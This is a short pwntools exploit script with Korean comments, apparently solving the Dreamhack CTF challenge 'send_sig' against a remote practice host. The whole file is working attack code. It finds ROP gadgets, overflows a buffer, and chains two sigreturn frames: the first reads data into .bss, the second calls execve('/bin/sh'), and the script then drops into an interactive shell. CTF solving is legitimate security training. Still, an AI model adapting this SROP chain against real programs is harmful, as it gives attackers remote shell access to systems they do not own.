from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'x86_64'
p = remote('host8.dreamhack.games', 22833)
elf = ELF('./send_sig')

#syscall을 불러오는 가젯, sigreturn 불러오기 용
gadget = next(elf.search(asm('pop rax; ret')))

#execve 실행 시 필요한 syscall
syscall = next(elf.search(asm('syscall')))

sh = b'/bin/sh\x00'

#shellcode를 저장하고, sigreturn공격에 필요한 것들을 저장하기 위한 스택
#PIE가 적용되어 있지 않으면, 실행 위치 변경X 및 쓰기가 가능한 영역이라 bss사용
bss = elf.bss()

#Sigreturn 프레임 작성
frame = SigreturnFrame()
frame.rax = 0 #read 시스템 콜
frame.rdi = 0 #표준입력
frame.rsi = bss #입력한 값을 bss에 저장
frame.rdx = 0x1000 #얼마나 많이 읽어올 것인가
frame.rip = syscall #다음에 실행한 코드 - syscall 가젯 코드
frame.rsp = bss #스택 포인터 이동


#공격 실행
payload = b'A' * 8
payload += b'B' * 8 #ret주소까지 도달하기 위한 더미
payload += p64(gadget)
payload += p64(15) #sigreturn을 불러옴
payload += p64(syscall)
payload += bytes(frame)
p.sendline(payload)


#execve 실행하는 프레임
frame2 = SigreturnFrame()
frame2.rip = syscall
frame2.rax = 0x3b #execve 시스템 콜
frame2.rsp = bss + 0x500 #새롭게 데이터를 쓸 공간, 넉넉하게 0x500뒤로 잡음
frame2.rdi = bss + 0x110

rop = p64(gadget)
rop += p64(15)
rop += p64(syscall)
rop += bytes(frame2)
rop += sh
p.sendline(rop)
p.interactive()